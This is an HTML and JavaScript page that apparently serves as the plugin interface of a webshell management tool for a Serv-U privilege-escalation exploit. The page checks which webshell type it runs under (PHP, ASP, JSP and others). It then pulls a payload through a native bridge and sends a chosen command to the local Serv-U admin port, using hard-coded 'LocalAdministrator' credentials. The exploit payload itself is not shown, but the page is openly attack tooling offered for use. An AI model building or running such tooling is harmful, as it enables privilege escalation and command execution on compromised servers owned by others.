<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <title>Serv-U PrivEsc</title>
    <style>
        html, body {
            min-height: 100%;
            margin: 0;
            padding: 0;
            background-color: #000000;
            color: #ffffff;
            overflow-y: auto; 
            overflow-x: hidden;
        }
        body { 
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
            padding: 20px;
        }
        
        .container { 
            width: 100%;
            max-width: 650px; 
            background: #000000; 
            padding: 25px; 
            border-radius: 0px;
            border: 1px solid #ffffff;
            box-sizing: border-box;
            margin: auto; 
        }
        
        h2 { 
            color: #ffffff;
            margin-top: 0; 
            border-bottom: 1px solid #ffffff; 
            padding-bottom: 10px;
            font-size: 18px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .status-bar { 
            background: #000000; 
            padding: 10px; 
            margin-bottom: 20px; 
            font-size: 12px; 
            border: 1px dashed #ffffff;
            text-transform: uppercase;
        }
        
        .badge { padding: 0px 4px; font-weight: bold; }
        .badge-active { background: #ffffff; color: #000000; }
        .badge-error { border: 1px dashed #ffffff; background: transparent; color: #ffffff; }
        
        .form-row {
            display: flex;
            gap: 15px;
            margin-bottom: 15px;
        }
        .form-group { flex: 1; margin-bottom: 15px; }
        .form-group.full-width { width: 100%; }
        
        label { 
            display: block; 
            margin-bottom: 5px; 
            color: #ffffff; 
            text-transform: uppercase; 
            font-size: 12px;
            font-weight: bold;
        }
        
        input[type="text"] { 
            width: 100%; 
            background: #000000; 
            border: 1px solid #ffffff; 
            color: #ffffff; 
            padding: 8px; 
            border-radius: 0px; 
            box-sizing: border-box; 
            font-family: inherit;
        }
        input[type="text"]:focus {
            outline: none;
            background: #111111; 
        }
        
        button { 
            background-color: transparent; 
            color: #ffffff; 
            font-weight: bold; 
            font-family: inherit;
            border: 1px solid #ffffff; 
            padding: 10px 25px; 
            cursor: pointer; 
            border-radius: 0px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        button:hover:not(:disabled) { 
            background-color: #ffffff; 
            color: #000000;
        }
        button:disabled { 
            border-color: #444444; 
            color: #444444; 
            cursor: not-allowed; 
        }
        
        h3 {
            font-size: 13px;
            color: #ffffff;
            text-transform: uppercase;
            margin-top: 25px;
        }
        
        .console { 
            background: #000000; 
            border: 1px solid #ffffff; 
            padding: 15px; 
            height: 180px; 
            overflow-y: auto; 
            white-space: pre-wrap;
            font-size: 13px;
            line-height: 1.5;
        }

        .msf-line { margin-bottom: 4px; color: #ffffff; } 
        .msf-info { color: #3498db; font-weight: bold; }
        .msf-success { color: #2ecc71; font-weight: bold; }
        .msf-warn { color: #f1c40f; font-weight: bold; }
        .msf-error { color: #e74c3c; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h2>[ SERV-U_PRIVESC ]</h2>
    
    <div class="status-bar" id="statusBar">
        [*] INITIALIZING SYSTEM CONTROLLER... AWAITING LOGS...
    </div>
    
    <div class="form-row">
        <div class="form-group" style="flex: 3;">
            <label>> LOCAL PATH</label>
            <input type="text" id="txtServUIp" value="localhost">
        </div>
        <div class="form-group" style="flex: 1;">
            <label>> LOCAL_PORT</label>
            <input type="text" id="txtServUPort" value="43958">
        </div>
    </div>

    <div class="form-row">
        <div class="form-group">
            <label>> USERNAME</label>
            <input type="text" id="txtExploitUser" value="LocalAdministrator">
        </div>
        <div class="form-group">
            <label>> PASSWORD</label>
            <input type="text" id="txtExploitPass" value="#l@$ak#.lk;0@P">
        </div>
    </div>

    <div class="form-group full-width">
        <label>> ROOT_COMMAND_INJECTION</label>
        <input type="text" id="txtCommand" value="whoami /all">
    </div>

    <button id="btnExploit" onclick="executePlugin()" disabled>RUN_EXPLOIT</button>

    <h3>SYSTEM_LOG_OUTPUT</h3>
    <div class="console" id="consoleOutput"></div>
</div>

<script>
    const pluginManifest = {
        "supportedLangs": [
            "PHP/v5.X/OneShell",
            "PHP/v7.X/OneShell",
            "PHP/v8.X/OneShell",
            "ASP/Classic/OneShell",
            "ASPX/JScript/OneShell",
            "ASPX/NebulaPulsar/DarkMatter",
            "ASHX/JScript/OneShell",
            "ASHX/NebulaPulsar/DarkMatter",
            "ASMX/JScript/OneShell",
            "ASMX/NebulaPulsar/DarkMatter",
            "JSP/Nashorn/OneShell",
            "JSP/NebulaPulsar/DarkMatter",
            "JSPX/Nashorn/OneShell",
            "JSPX/NebulaPulsar/DarkMatter",
            "CFM/NebulaPulsar/DarkMatter",
            "Perl/CGI/OneShell",
            "Ruby/CGI/OneShell",
        ]
    };

    let currentShellType = "";

    function appendLog(text) {
        const consoleOutput = document.getElementById('consoleOutput');
        if (!text) return;

        const lines = text.split('\n');
        
        lines.forEach(line => {
            if (line.trim() === "") return;

            let div = document.createElement('div');
            div.className = 'msf-line';

            if (line.startsWith('[*]')) {
                div.innerHTML = `<span class="msf-info">[*]</span> ${line.substring(3)}`;
            } else if (line.startsWith('[+]')) {
                div.innerHTML = `<span class="msf-success">[+]</span> ${line.substring(3)}`;
            } else if (line.startsWith('[-]')) {
                div.innerHTML = `<span class="msf-error">[-]</span> ${line.substring(3)}`;
            } else if (line.startsWith('[!]')) {
                div.innerHTML = `<span class="msf-warn">[!]</span> ${line.substring(3)}`;
            } else {
                div.innerText = line; 
            }

            consoleOutput.appendChild(div);
        });

        consoleOutput.scrollTop = consoleOutput.scrollHeight;
    }

    window.addEventListener('DOMContentLoaded', async () => {
        const statusBar = document.getElementById('statusBar');
        const btnExploit = document.getElementById('btnExploit');

        try {
            if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
                const bridge = window.chrome.webview.hostObjects.nativeBridge;
                currentShellType = await bridge.fnGetShellType();

                if (pluginManifest.supportedLangs.includes(currentShellType)) {
                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-active">${currentShellType.toUpperCase()}</span> // STATUS: READY`;
                    btnExploit.disabled = false;
                    appendLog("[*] CONNECTION ESTABLISHED.");
                    appendLog("[*] READY TO PARSE VULNERABILITY MATRIX.");
                } else {
                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-error">${currentShellType.toUpperCase()}</span> // STATUS: INCOMPATIBLE`;
                    appendLog(`[-] ABORTED. EXPLOIT REQUIRES: [${pluginManifest.supportedLangs.join(', ')}].`);
                    appendLog(`[-] DETECTED ENVIRONMENT: ${currentShellType}.`);
                }
            } else {
                appendLog("[!] BRIDGE_ERROR: HOST_NOT_FOUND. CORE OVERRIDE RE-ROUTE REQUIRED.");
            }
        } catch (e) {
            appendLog("[!] EXCEPTION_CAUGHT: " + e.message.toUpperCase());
        }
    });

    async function executePlugin() {
        const configParams = {
            ip: document.getElementById('txtServUIp').value,
            port: document.getElementById('txtServUPort').value,
            user: document.getElementById('txtExploitUser').value,
            pass: document.getElementById('txtExploitPass').value,
            cmd: document.getElementById('txtCommand').value
        };

        appendLog(`[*] REQUESTING SCHEMATICS FOR: ${currentShellType.toUpperCase()}`);

        const bridge = window.chrome.webview.hostObjects.nativeBridge;

        const currentDir = window.location.pathname.substring(1, window.location.pathname.lastIndexOf('/') + 1).replace("/", "\\");
        const payloadCode = await bridge.fnGetPayload(currentDir, currentShellType, "payload");
        
        appendLog(`[+] CONNECTING TO LOCAL PORT ${configParams.port}...`);
        appendLog('[+] INJECTING EXPLOIT MEMORY OVERRIDE...');
        appendLog('[*] EXECUTING REMOTE SHELL ENGINE...');

        const szJsonConfig = JSON.stringify(configParams);

        const result = await bridge.fnRun(szJsonConfig, payloadCode, currentShellType);
        
        appendLog(result.toUpperCase());
    }
</script>

</body>
</html>
